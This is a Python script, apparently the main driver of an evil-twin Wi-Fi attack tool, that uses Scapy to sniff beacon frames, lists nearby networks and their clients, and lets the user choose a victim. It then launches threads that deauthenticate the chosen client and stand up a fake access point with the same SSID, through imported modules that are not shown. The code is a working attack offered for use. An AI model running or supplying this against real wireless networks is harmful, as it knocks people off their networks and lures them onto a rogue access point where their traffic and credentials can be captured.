import os
import re
import csv
import subprocess
# import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import WifiAdapter as WAF
import deautenticate as DA
import Twin_create as TC
from scapy import all as sc
import time
from threading import Thread




AvialableWifiNetworks = []
Clients = []
ChosenWifiMA = ""
ChosenWifiSSID = ""
WifiAdapter = ""


def PacketHendler(packet):
    #if packet end with 11 like 802.11
    if packet.haslayer(sc.Dot11):
        #type -menegment subtype-beacon
        if packet.type==0 and packet.subtype==8:
            #address 2 - transmitter.
            exist = False
            # add the packet to AvialableWifiNetworks if not already in
            for pkt in AvialableWifiNetworks:
                if packet.addr2 == pkt.addr2:
                    exist = True
            if not exist:
                AvialableWifiNetworks.append(packet)
                # print("Access Point Mac: %s with SSID:%s" %(packet.addr2 ,packet.info))



#  WifiAdapter = selected interface
def WifiNetworksFinder():
    print("\nScanning for avialable wireless netwroks...\n")
    #  iface = the interfaces that we would like to sniff on
    # prn = allows us to pass a function that executes with each packet sniffed
    sc.sniff(iface=WifiAdapter, prn=PacketHendler , timeout = 40)

    # printing the Available Wifi Networks withe their ssid(name) and their mac address
    print("\n\n\nThe Available Wifi Networks are:\n")
    for index, item in enumerate(AvialableWifiNetworks):
        print(f"{index} - SSID : {item.info} , MAC Address : {item.addr2} ,")
    print("\n\n")
    while True:
        wifi_network_choice = input("Please select the Wifi network you want to use for the attack: ")
        try:
            if AvialableWifiNetworks[int(wifi_network_choice)]:
                break
        except:
            print("Unavialable choise! please enter a number from the list above.")
    ChosenWifiSSID = AvialableWifiNetworks[int(wifi_network_choice)].info
    ChosenWifiMA = AvialableWifiNetworks[int(wifi_network_choice)].addr2
    # ChosenWifiSSID = str[2:len(str)]
    return [ChosenWifiMA , ChosenWifiSSID]


def ClientsFinder():
    print("\nScanning for clients...\n")
    sc.sniff(iface=WifiAdapter, prn=CLientsSniffing , timeout = 40)
    print("\n\n\nThe Clients who connected to the chosen wifi are:\n")
    for index, item in enumerate(Clients):
        print(f"{index} MAC Address : {item} ,")
    print("\n\n")
    while True:
        Chosen_Client = input("Please select the Wifi Client you want to attack: ")
        try:
            if Clients[int(Chosen_Client)]:
                break
        except:
            print("Please enter a number that corresponds with the choices available.")
    return Clients[int(Chosen_Client)]


def CLientsSniffing(pkt):
    stamgmtstypes = (0, 2, 4)
    # Make sure the packet has the Scapy Dot11 layer present
    if pkt.haslayer(sc.Dot11):
        # Check to make sure this is a management frame (type=0) and that
        # the subtype is one of our management frame subtypes indicating a
        # a wireless client
        # if pkt.type == 0 and pkt.subtype in stamgmtstypes:
        #     if (pkt.addr1 == ChosenWifiMA or pkt.addr3 == ChosenWifiMA or pkt.addr3 == ChosenWifiMA):
        #         print(pkt.summary())
        #         if pkt.info not in Clients:
        #             Clients.append(pkt.info)
        if pkt.addr2 not in AvialableWifiNetworks and pkt.addr3 == ChosenWifiMA and pkt.addr2 not in Clients and pkt.addr2 != ChosenWifiMA:
            Clients.append(pkt.addr2)
            # print(len(Clients),"     " ,pkt.addr2)




if __name__ == "__main__":

    #finding wifi adapter
    WifiAdapter = WAF.WifiAdapterFinder()
    #changing adapter to monitor mode
    WAF.MonitorMode(WifiAdapter)
    #scanning for wifi network to attack
    wifi_details = WifiNetworksFinder()
    ChosenWifiMA = wifi_details[0]
    ChosenWifiSSID = wifi_details[1]
    #finding a specific client of the chosen wifi network to attack
    ChosenClient=ClientsFinder()


    print("wifi adapter is : " , WifiAdapter)
    print("chosen wifi mac address is : " , ChosenWifiMA)
    print("chosen wifi ssid is : " , ChosenWifiSSID)
    print("chosen client mac address is : " , ChosenWifiSSID)
    #create thread that disconnect the victim from the chosen wifi 
    Deauthenticate_thread = Thread(target=DA.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])

    #create thread that create an fake wireless network (evil twin)
    TwinNet_thread = Thread(target = TC.create_fake_access_point , args = [WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID])

    Deauthenticate_thread.start()
    TwinNet_thread.start()

    TwinNet_thread.join()
    Deauthenticate_thread.join()
    # DA.deautenticate_user(WifiAdapter,ChosenWifiMA,chosenClient)
    # TC.create_fake_access_point(WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID)
    






# # IFACE = WAF.WifiAdapterFinder()
# # IFACE_NAME = WAF.MonitorMode(IFACE)
# iface = "wlan0mon"
# devices = set()
# def PacketHandler(pkt):
#     print("packet found")
#     if pkt.haslayer(Dot11):
#         dot11_layer = pkt.getlayer(Dot11)
#         print("packet has layer dot11")  
#         if dot11_layer.addr2 and (dot11_layer.addr2 not in devices):
#             devices.add(dot11_layer.addr2)
#             print((len(devices) -1 ), dot11_layer.addr2, dot11_layer.payload.name)
  
  
# sniff(iface=iface,prn=PacketHandler)